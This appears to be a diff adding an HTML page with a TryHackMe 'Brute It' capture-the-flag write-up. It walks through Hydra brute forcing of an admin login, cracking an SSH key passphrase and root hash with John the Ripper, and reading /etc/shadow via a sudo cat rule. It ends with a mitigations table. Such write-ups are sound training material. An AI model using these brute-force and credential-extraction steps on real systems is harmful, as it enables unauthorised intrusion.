@@ -1,0 +1,181 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Brute It — TryHackMe writeup | Farhan Hussain</title>
+<meta name="description" content="A username left in an HTML comment led to a Hydra brute force of the admin panel. The panel served an encrypted SSH private key for user john; John the…">
+<link rel="canonical" href="https://thecyberfarhan.github.io/writeups/bruteit.html">
+<meta property="og:title" content="Brute It — TryHackMe writeup">
+<meta property="og:description" content="A username left in an HTML comment led to a Hydra brute force of the admin panel. The panel served an encrypted SSH private key for user john; John the…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://thecyberfarhan.github.io/writeups/bruteit.html">
+<meta name="twitter:card" content="summary">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='7' fill='%23161b22'/%3E%3Crect x='1' y='1' width='30' height='30' rx='6' fill='none' stroke='%23B4232C' stroke-width='2'/%3E%3Ctext x='16' y='22' font-family='Arial' font-size='18' font-weight='700' text-anchor='middle' fill='%23e6edf3'%3EF%3C/text%3E%3C/svg%3E">
+<link rel="stylesheet" href="writeup.css">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"TechArticle","headline":"Brute It — TryHackMe writeup","description":"A username left in an HTML comment led to a Hydra brute force of the admin panel. The panel served an encrypted SSH private key for user john; John the…","author":{"@id":"https://thecyberfarhan.github.io/#me"},"datePublished":"2026-06-07","url":"https://thecyberfarhan.github.io/writeups/bruteit.html","mainEntityOfPage":"https://thecyberfarhan.github.io/writeups/bruteit.html"}</script>
+</head>
+<body>
+<div class="wrap">
+  <div class="topbar">
+    <a class="back" href="./">&larr; All writeups</a>
+    <a class="brand" href="https://thecyberfarhan.github.io/">Farhan<span>.</span></a>
+  </div>
+  <p class="eyebrow" data-reveal>TryHackMe writeup</p>
+  <h1 data-reveal>Brute It</h1>
+  <div class="meta" data-reveal>
+    <span class="plat">TryHackMe</span>
+    <span class="diff">Easy</span>
+    <span>June 7, 2026</span>
+  </div>
+  <div class="tldr" data-reveal><b>TL;DR</b>A username left in an HTML comment led to a Hydra brute force of the admin panel. The panel served an encrypted SSH private key for user <code>john</code>; John the Ripper cracked the passphrase in milliseconds. Once in, <code>sudo cat</code> with no password restriction let us read <code>/etc/shadow</code>, and cracking the root hash with John handed over the password to <code>su</code> straight into a root shell. </div>
+  <div class="tools"><span class="chip">🔎 RustScan + Nmap</span><span class="chip">🕷 Feroxbuster</span><span class="chip">🐉 Hydra</span><span class="chip">🔑 ssh2john + John the Ripper</span><span class="chip">🔐 SSH</span></div>
+  <h2 data-reveal>Introduction</h2>
+<p>Today's target is <strong>Brute It</strong> — a box that doesn't waste time on subtlety. The name tells you the method, an HTML comment tells you the username, and the admin panel hands you an SSH key once you've knocked loudly enough with Hydra. The privilege escalation path is a masterclass in how a single dangerous <code>sudo</code> rule can unravel an entire system: <code>sudo cat</code> sounds harmless until you realise it can read <code>/etc/shadow</code>, the one file that was standing between an unprivileged user and root access. Subtle, this box is not. Educational, absolutely.</p>
+<h3>Prerequisites</h3>
+<p>Readers are assumed to know:</p>
+<ul><li>What HTTP POST form brute forcing is and how Hydra constructs the attack</li><li>What an SSH private key is and why a passphrase protects it</li><li>What <code>/etc/shadow</code> is and why it's sensitive</li><li>What <code>su</code> does and how it differs from <code>sudo</code></li><li>Basic hash cracking with John the Ripper</li></ul>
+<h2 data-reveal>Recon</h2>
+<p class="aside">(~0 mins into the box)</p>
+<h3>Port Scan</h3>
+<p class="aside">Full-range sweep with RustScan, Nmap for service and version fingerprinting:</p>
+<pre><code>rustscan -a 10.48.165.203 -r 1-65535 --ulimit 5000 -- -Pn -sC -sV</code></pre>
+<table><thead><tr><th>Port</th><th>Service</th><th>Version</th></tr></thead><tbody><tr><td>22/tcp</td><td>SSH</td><td>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3</td></tr><tr><td>80/tcp</td><td>HTTP</td><td>Apache httpd 2.4.29 (Ubuntu)</td></tr></tbody></table>
+<p>Standard two-port setup. Apache 2.4.29 is showing some age — Ubuntu 18.04 era. The HTTP title returns the default Apache page, which means the actual content is hiding somewhere else. Time to enumerate.</p>
+<h3>Web Directory Enumeration</h3>
+<p class="aside">(~3 mins into the box)</p>
+<p class="aside">Feroxbuster with PHP, TXT, and HTML extensions:</p>
+<pre><code>feroxbuster -u http://10.48.165.203 \
+  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
+  -x php,txt,html</code></pre>
+
+<pre><code># output (relevant hits only)
+301  http://10.48.165.203/admin          # ^^^ login panel
+200  http://10.48.165.203/admin/index.php
+301  http://10.48.165.203/admin/panel    # ^^^ post-login area</code></pre>
+<p><code>/admin/</code> is the target. The existence of <code>/admin/panel/</code> suggests something waits beyond a successful login.</p>
+<h3>HTML Source — Username in a Comment</h3>
+<p class="aside">Viewing the admin login page source:</p>
+<pre><code>view-source:http://10.48.165.203/admin/</code></pre>
+
+<pre><code>&lt;!-- Hey john, if you do not remember, the username is admin --&gt;</code></pre>
+<p>Someone left a note for John. We're reading John's mail now. Username: <code>admin</code>. The comment also leaks the name <code>john</code> — which becomes relevant later as a system user.</p>
+<h2 data-reveal>Foothold</h2>
+<p class="aside">(~5 mins into the box)</p>
+<h3>HTTP POST Brute Force — Hydra</h3>
+<p>With the username confirmed as <code>admin</code>, Hydra attacks the login form. The failure string (<code>Invalid</code>) was identified by submitting a wrong password manually and checking the response — a required step before constructing the Hydra command correctly.</p>
+<p class="aside">Brute forcing the admin login with rockyou.txt:</p>
+<pre><code>hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.165.203 \
+  http-post-form "/admin/:user=^USER^&amp;pass=^PASS^:F=Invalid" -V</code></pre>
+
+<pre><code># output (truncated — ran ~500 attempts before hitting)
+[80][http-post-form] host: 10.48.165.203   login: admin   password: xavier</code></pre>
+<p class="aside">(truncated — full attempt log in notes)</p>
+<p>Password: <code>xavier</code>. Admin panel access confirmed.</p>
+<h3>Admin Panel — SSH Private Key</h3>
+<p>Inside the admin panel at <code>/admin/panel/</code>, the page surfaces an RSA private key for user <code>john</code> — encrypted with a passphrase. The key was copied and saved locally as <code>id_rsa</code>.</p>
+<h3>SSH Key Passphrase Cracking — John the Ripper</h3>
+<p><strong>Why crack an SSH key passphrase?</strong> An encrypted SSH private key is useless without its passphrase — the passphrase derives the decryption key that unlocks the actual RSA key material. <code>ssh2john</code> converts the key into a hash format John the Ripper understands, then rockyou.txt does the rest.</p>
+<p class="aside">Converting the key to a crackable hash:</p>
+<pre><code>ssh2john id_rsa &gt; key.hash</code></pre>
+<p class="aside">Cracking the passphrase:</p>
+<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt key.hash</code></pre>
+
+<pre><code># output
+rockinroll       (id_rsa)
+1g : DONE</code></pre>
+<p>Passphrase: <code>rockinroll</code>. Cracked before the progress bar had time to render.</p>
+<h2 data-reveal>Shell / Access</h2>
+<p class="aside">(~10 mins into the box)</p>
+<p class="aside">SSH into the box as <code>john</code> using the decrypted private key:</p>
+<pre><code>ssh john@10.48.165.203 -i id_rsa</code></pre>
+
+<pre><code>Enter passphrase for key 'id_rsa': rockinroll
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-118-generic x86_64)
+john@bruteit:~$</code></pre>
+<p class="aside">Collecting the user flag:</p>
+<pre><code>cat user.txt</code></pre>
+
+<pre><code>THM{a_password_is_not_a_barrier}</code></pre>
+<p>The flag is self-aware. Points for honesty.</p>
+<h2 data-reveal>Escalation</h2>
+<p class="aside">(~12 mins into the box)</p>
+<h3>sudo cat — Reading /etc/shadow</h3>
+<p class="aside">Checking sudo permissions:</p>
+<pre><code>sudo -l</code></pre>
+
+<pre><code>User john may run the following commands on bruteit:
+    (root) NOPASSWD: /bin/cat</code></pre>
+<p><strong>Why is <code>sudo cat</code> dangerous?</strong> <code>cat</code> reads files and prints their contents to stdout — nothing more. But when run as root, it can read *any* file on the system, including files that are normally restricted to root only. <code>/etc/shadow</code> stores hashed passwords for every user account. A low-privilege user can't read it directly — but <code>sudo cat</code> bypasses that restriction entirely.</p>
+<p class="aside">Reading the shadow file:</p>
+<pre><code>sudo cat /etc/shadow</code></pre>
+
+<pre><code># output (relevant entries only)
+root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
+john:$6$iODd0YaH$BA2G28eil/ZUZAV5uNaiNPE0Pa6XHWUFp7uNTp2mooxwa4UzhfC0kjpzPimy1slPNm9r/9soRw8KqrSgfDPfI0:18490:0:99999:7:::</code></pre>
+<p class="aside">(truncated — only root and john hashes are actionable)</p>
+<h3>Cracking the Root Hash</h3>
+<p>The root hash format is <code>$6$</code> — SHA-512 crypt, Hashcat mode 1800 / John type <code>sha512crypt</code>. Rockyou.txt handles it in under a second.</p>
+<p class="aside">Saving the root hash and cracking it:</p>
+<pre><code>john --wordlist=/usr/share/wordlists/rockyou.txt root.hash</code></pre>
+
+<pre><code># output
+football         (root)
+1g : DONE</code></pre>
+<p>Root password: <code>football</code>.</p>
+<h3>su root — Becoming Root</h3>
+<p>With the plaintext root password in hand, <code>su</code> completes the escalation without any further tricks needed.</p>
+<p class="aside">Switching to root:</p>
+<pre><code>su root</code></pre>
+
+<pre><code>Password: football
+root@bruteit:/home/john#</code></pre>
+<p class="aside">Collecting the root flag:</p>
+<pre><code>cat /root/root.txt</code></pre>
+
+<pre><code>THM{pr1v1l3g3_3sc4l4t10n}</code></pre>
+
+<h2 data-reveal>The Full Chain</h2>
+<p>The complete attack chain, end to end:</p>
+<ol><li><strong>HTML source comment</strong> → username <code>admin</code>, system username hint <code>john</code></li><li><strong>Hydra HTTP POST brute force</strong> → admin panel password <code>xavier</code></li><li><strong>Admin panel</strong> → encrypted SSH private key for <code>john</code></li><li><strong>John the Ripper</strong> → SSH key passphrase <code>rockinroll</code></li><li><strong>SSH login as <code>john</code></strong> → user flag</li><li><strong><code>sudo cat /etc/shadow</code></strong> → root password hash extracted</li><li><strong>John the Ripper</strong> → root password <code>football</code></li><li><strong><code>su root</code></strong> → root shell → root flag</li></ol>
+<h2 data-reveal>Rabbit Holes</h2>
+<h3>Attempting SSH Without <code>-i</code></h3>
+<p>First SSH attempt reflexively ran without specifying the key file — prompted for a password instead of the passphrase, which failed since <code>john</code> has no password authentication configured. One <code>Ctrl+C</code> and a corrected command later, <code>-i id_rsa</code> sorted it.</p>
+<h2 data-reveal>Mitigations</h2>
+<table><thead><tr><th>Vulnerability</th><th>Severity</th><th>Mitigation</th></tr></thead><tbody><tr><td>Username hardcoded in HTML comment</td><td class="sev-medium">Medium</td><td>Never put credentials, usernames, or hints in client-deliverable HTML; use server-side session management</td></tr><tr><td>Weak admin password (<code>xavier</code>) in rockyou.txt</td><td class="sev-high">High</td><td>Enforce strong password policy; implement account lockout or rate limiting on login forms</td></tr><tr><td>Encrypted SSH key exposed via admin panel</td><td class="sev-high">High</td><td>Private keys should never be accessible through a web interface; use certificate-based SSH with keys stored only on authorised hosts</td></tr><tr><td>Weak SSH key passphrase (<code>rockinroll</code>)</td><td class="sev-high">High</td><td>Use a long, randomly generated passphrase for any SSH key; consider a hardware token</td></tr><tr><td><code>sudo cat</code> with <code>NOPASSWD</code></td><td class="sev-critical">Critical</td><td><code>cat</code> can read any file as root — granting this is equivalent to granting read access to the entire filesystem; remove it entirely from <code>sudoers</code></td></tr><tr><td>Weak root password (<code>football</code>) in rockyou.txt</td><td class="sev-critical">Critical</td><td>Root password must be long and random; disable direct root login via <code>su</code> and require <code>sudo</code> with MFA</td></tr></tbody></table>
+  <div class="takeaway" data-reveal><b>Key takeaway</b><code>sudo cat</code> is not a safe alternative to <code>sudo vim</code> or <code>sudo bash</code> — the ability to read any file as root is all an attacker needs to extract <code>/etc/shadow</code>, <code>/root/.ssh/id_rsa</code>, or any other secret on the system. Before adding anything to <code>sudoers</code>, ask: "what happens if this binary reads a file it shouldn't?" If the answer is "total compromise," keep it off the list.</div>
+  <h2 data-reveal>If I Did It Again</h2>
+<p>Pipe the <code>/etc/shadow</code> output directly through John on the victim side isn't possible (no John on target), but save a step by pulling only the root line with <code>sudo cat /etc/shadow | grep root</code> rather than copying the entire file — cleaner notes, same result.</p>
+  <div class="cta-row">
+    <a class="btn primary" href="https://github.com/thecyberfarhan/CTF-Writeups/blob/main/TryHackme/bruteit_writeup.md" target="_blank" rel="noopener">Full writeup on GitHub &rarr;</a>
+    <a class="btn" href="./">More writeups</a>
+  </div>
+  <footer>Part of <a href="https://thecyberfarhan.github.io/">thecyberfarhan.github.io</a>. Auto-generated from the <a href="https://github.com/thecyberfarhan/CTF-Writeups">CTF-Writeups</a> repo — edits happen there, not here.</footer>
+</div>
+<script>
+document.querySelectorAll('pre').forEach(function (pre) {
+  var btn = document.createElement('button');
+  btn.className = 'copy-btn';
+  btn.type = 'button';
+  btn.innerHTML = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg><span>Copy</span>';
+  btn.addEventListener('click', function () {
+    var code = pre.querySelector('code');
+    var text = code ? code.textContent : pre.textContent;
+    navigator.clipboard.writeText(text).then(function () {
+      btn.classList.add('copied');
+      btn.querySelector('span').textContent = 'Copied';
+      setTimeout(function () { btn.classList.remove('copied'); btn.querySelector('span').textContent = 'Copy'; }, 1500);
+    }).catch(function () {});
+  });
+  pre.appendChild(btn);
+});
+if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+  var io = new IntersectionObserver(function (es) {
+    es.forEach(function (e) { if (e.isIntersecting) { e.target.classList.add('in'); io.unobserve(e.target); } });
+  }, { threshold: 0.1 });
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { io.observe(el); });
+} else {
+  document.querySelectorAll('[data-reveal]').forEach(function (el) { el.classList.add('in'); });
+}</script>
+</body>
+</html>
